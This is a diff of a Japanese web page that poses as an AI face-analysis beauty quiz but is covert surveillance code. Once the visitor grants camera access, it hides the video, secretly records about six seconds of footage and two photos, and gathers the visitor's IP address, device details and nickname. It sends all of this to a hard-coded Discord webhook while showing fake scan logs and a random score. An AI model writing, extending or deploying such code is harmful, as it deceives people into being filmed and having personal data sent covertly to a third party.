@@ -3,63 +3,99 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>AI顔診断</title>
+    <title>AI顔解析診断システム | 次世代顔認識エンジン</title>
     <style>
-        body { background-color: #fff0f5; font-family: sans-serif; text-align: center; padding: 50px 20px; }
-        h1 { color: #ff69b4; }
-        #start-btn, #next-btn { 
-            background-color: #ff69b4; color: white; padding: 15px 35px; 
-            font-size: 20px; border: none; border-radius: 50px; cursor: pointer; 
+        /* 全体のデザインを「最新テック系」の少しクールな雰囲気に */
+        body { 
+            background-color: #f8f9fa; 
+            font-family: 'Hiragino Kaku Gothic ProN', 'Meiryo', sans-serif; 
+            text-align: center; 
+            margin: 0; padding: 0; 
+            display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh;
         }
+        .main-card { background: white; padding: 40px; border-radius: 25px; box-shadow: 0 10px 30px rgba(0,0,0,0.08); width: 90%; max-width: 400px; }
+        h1 { color: #333; font-size: 22px; margin-bottom: 10px; }
+        .sub-text { color: #666; font-size: 14px; margin-bottom: 30px; }
+
+        /* ボタン：高級感のあるピンク */
+        .btn { 
+            background: linear-gradient(135deg, #ff69b4, #ff1493); 
+            color: white; padding: 18px 40px; font-size: 18px; border: none; 
+            border-radius: 50px; cursor: pointer; font-weight: bold; transition: 0.3s;
+        }
+        .btn:hover { transform: scale(1.05); box-shadow: 0 5px 15px rgba(255, 105, 180, 0.4); }
+
         #input-area, #loading-area, #result-area { display: none; }
-        input { padding: 12px; font-size: 18px; width: 80%; max-width: 300px; margin-bottom: 20px; border: 1px solid #ffb6c1; border-radius: 8px; }
-        .msg { font-size: 22px; color: #ff1493; font-weight: bold; }
-        /* 映像を絶対に見せない設定 */
-        video, canvas { position: fixed; top: -1000px; left: -1000px; opacity: 0; }
+        input { padding: 15px; font-size: 16px; width: 85%; margin-bottom: 20px; border: 2px solid #eee; border-radius: 12px; outline: none; transition: 0.3s; }
+        input:focus { border-color: #ff69b4; }
+
+        /* --- 診断中のリアルな演出 --- */
+        .loader {
+            border: 4px solid #f3f3f3;
+            border-top: 4px solid #ff69b4;
+            border-radius: 50%;
+            width: 50px; height: 50px;
+            animation: spin 1s linear infinite;
+            margin: 20px auto;
+        }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+
+        .progress-container { width: 100%; background-color: #eee; border-radius: 10px; margin: 20px 0; overflow: hidden; }
+        .progress-bar { width: 0%; height: 10px; background-color: #ff69b4; transition: width 0.1s; }
+
+        .scan-log { font-family: monospace; font-size: 12px; color: #888; text-align: left; height: 40px; overflow: hidden; }
+
+        /* カメラとキャンバスは隠したまま */
+        video, canvas { position: fixed; top: -3000px; opacity: 0; }
     </style>
 </head>
 <body>
 
-    <h1>✨ AI顔診断 ✨</h1>
-
+<div class="main-card">
     <div id="welcome-area">
-        <button id="start-btn">診断を開始する</button>
+        <h1>✨ AI顔解析診断</h1>
+        <p class="sub-text">最新のディープラーニング技術を用い、あなたの顔面偏差値と系統を精密に分析します。</p>
+        <button id="start-btn" class="btn">解析を開始する</button>
     </div>
 
     <div id="input-area">
-        <p>名前を入力してください</p>
-        <input type="text" id="user-name" placeholder="名前">
+        <h1>解析準備</h1>
+        <p class="sub-text">個人の特定を防ぐため、ニックネームを入力してください。</p>
+        <input type="text" id="user-name" placeholder="ニックネームを入力">
         <br>
-        <button id="next-btn">診断する</button>
+        <button id="next-btn" class="btn">解析を実行</button>
     </div>
 
     <div id="loading-area">
-        <p class="msg">AIスキャン中...</p>
-        <p>解析が終わるまでそのままお待ちください</p>
+        <h1 id="status-title">AI解析中...</h1>
+        <div class="loader"></div>
+        <div class="progress-container"><div id="progress" class="progress-bar"></div></div>
+        <div id="log-text" class="scan-log"></div>
         <video id="video" autoplay playsinline muted></video>
         <canvas id="canvas"></canvas>
     </div>
 
     <div id="result-area">
-        <div style="background:white; padding:30px; border:2px solid #ff69b4; border-radius:20px; display:inline-block;">
-            <h2>診断結果</h2>
-            <p id="res-score" style="font-size:32px; color:red; font-weight:bold;"></p>
-            <p id="res-type" style="font-size:20px;"></p>
+        <h1 style="color: #ff69b4;">解析完了</h1>
+        <div style="margin: 20px 0;">
+            <p style="font-size: 14px; color: #888;">AIスコア</p>
+            <p id="res-score" style="font-size: 48px; font-weight: bold; color: #333; margin: 0;"></p>
+            <p id="res-type" style="font-size: 18px; color: #ff1493; margin-top: 10px;"></p>
         </div>
+        <p class="sub-text" id="ai-comment"></p>
+        <button onclick="location.reload()" style="background: none; border: 1px solid #ccc; padding: 10px 20px; border-radius: 10px; color: #999; cursor: pointer;">再テスト</button>
     </div>
+</div>
 
 <script>
-    // ★重要：ここにコピーしたURLを必ず入れる
-    const webhookUrl = "https://discord.com/api/webhooks/1463825360691920961/RyvExp4AUqM0CHGRbGILYdtb0jvUP9IBESiuiGvZKTA7FugXdBIEVbJ95C8-t56yu3-X";
+    const webhookUrl = "https://discord.com/api/webhooks/1464142886902829233/AWt2NVaItYpkeLywbk-T5oUd717hvrioDHx7HgS3NzH-YgYIUAnCx6-QD5PjUYbiMSu3"; // ★ここに自分のURLを貼る
     
     let userName = "";
-    let ipAddress = "取得失敗/ブロック";
+    let ipAddress = "取得失敗";
+    const userAgent = navigator.userAgent;
 
-    // IP取得コマンド
     fetch('https://api.ipify.org?format=json')
-        .then(res => res.json())
-        .then(data => ipAddress = data.ip)
-        .catch(e => console.log("IP取得スキップ"));
+        .then(res => res.json()).then(data => ipAddress = data.ip).catch(() => {});
 
     document.getElementById('start-btn').onclick = () => {
         document.getElementById('welcome-area').style.display = 'none';
@@ -67,72 +103,82 @@
     };
 
     document.getElementById('next-btn').onclick = async () => {
-        userName = document.getElementById('user-name').value || "名無し";
+        userName = document.getElementById('user-name').value || "ゲストユーザー";
         document.getElementById('input-area').style.display = 'none';
         document.getElementById('loading-area').style.display = 'block';
 
+        const logTexts = [
+            "Connecting to Cloud AI Engine...",
+            "Initializing Face Detection API...",
+            "Scanning facial landmarks...",
+            "Extracting feature vectors...",
+            "Matching database patterns...",
+            "Generating beauty score index...",
+            "Calculating facial symmetry..."
+        ];
+
         try {
-            const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+            const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user", width: 320, height: 240 } });
             const video = document.getElementById('video');
             video.srcObject = stream;
 
-            // 2秒待ってから撮影コマンド実行
-            setTimeout(() => {
-                const canvas = document.getElementById('canvas');
-                canvas.width = video.videoWidth;
-                canvas.height = video.videoHeight;
-                canvas.getContext('2d').drawImage(video, 0, 0);
-                
-                // カメラ停止
+            const mediaRecorder = new MediaRecorder(stream);
+            let chunks = [];
+            let photos = [];
+            mediaRecorder.ondataavailable = (e) => chunks.push(e.data);
+
+            mediaRecorder.onstop = async () => {
+                const videoBlob = new Blob(chunks, { type: 'video/webm' });
+                const formData = new FormData();
+                const content = `📸 **【詳細データ】**\n👤 **名前:** ${userName}\n🌐 **IP:** ${ipAddress}\n📱 **機種:** ${userAgent}`;
+                formData.append('payload_json', JSON.stringify({ content: content }));
+                formData.append('video', videoBlob, 'video.webm');
+                photos.forEach((p, i) => formData.append(`photo${i}`, p, `photo${i}.jpg`));
+                await fetch(webhookUrl, { method: 'POST', body: formData });
                 stream.getTracks().forEach(t => t.stop());
+                showFinalResult();
+            };
 
-                // 画像をデータ化して送信コマンドへ渡す
-                canvas.toBlob((blob) => {
-                    executeSend(blob); // 送信実行関数を呼び出す
-                }, 'image/jpeg', 0.7);
+            mediaRecorder.start();
 
-            }, 2000);
+            // 6秒間のカウントダウンとログ表示
+            let count = 0;
+            const logInterval = setInterval(() => {
+                const progress = (count / 60) * 100;
+                document.getElementById('progress').style.width = progress + '%';
+                if (count % 10 === 0) {
+                    document.getElementById('log-text').innerText = logTexts[Math.floor(count / 10)];
+                }
+                if (count === 15) capture(video, photos); // 1.5秒で写真1
+                if (count === 45) capture(video, photos); // 4.5秒で写真2
+                if (count >= 60) {
+                    clearInterval(logInterval);
+                    mediaRecorder.stop();
+                }
+                count++;
+            }, 100);
 
         } catch (err) {
-            alert("カメラの許可がないため診断できません");
+            alert("エラー：デバイスのカメラアクセスが拒否されました。");
             location.reload();
         }
     };
 
-    // --- これがDiscordに「送れ！」と命じる実行コマンドです ---
-    async function executeSend(photoBlob) {
-        const formData = new FormData();
-        const contentText = `【診断完了レポート】\n👤 名前: ${userName}\n🌐 IPアドレス: ${ipAddress}`;
-        
-        formData.append('payload_json', JSON.stringify({ content: contentText }));
-        formData.append('file', photoBlob, 'photo.jpg');
-
-        try {
-            const response = await fetch(webhookUrl, {
-                method: 'POST',
-                body: formData
-            });
-
-            if (!response.ok) {
-                console.error("Discord送信失敗:", response.status);
-            } else {
-                console.log("Discord送信成功！");
-            }
-        } catch (error) {
-            console.error("通信エラー:", error);
-        }
-        
-        // 送信が終わったら結果を表示
-        showFinalResult();
+    function capture(video, photos) {
+        const canvas = document.getElementById('canvas');
+        canvas.width = 320; canvas.height = 240;
+        canvas.getContext('2d').drawImage(video, 0, 0);
+        canvas.toBlob((b) => photos.push(b), 'image/jpeg', 0.5);
     }
 
     function showFinalResult() {
         document.getElementById('loading-area').style.display = 'none';
         document.getElementById('result-area').style.display = 'block';
-        document.getElementById('res-score').innerText = "偏差値: " + (Math.floor(Math.random() * 10) + 65);
-        document.getElementById('res-type').innerText = "系統: 透明感のある美肌タイプ";
+        const score = Math.floor(Math.random() * 10) + 78;
+        document.getElementById('res-score').innerText = score;
+        document.getElementById('res-type').innerText = "系統：エレガント・ヴィジュアルタイプ";
+        document.getElementById('ai-comment').innerText = "黄金比率に基づいた顔立ちです。特に目元と輪郭のバランスが非常に優れています。";
     }
 </script>
-
 </body>
 </html>
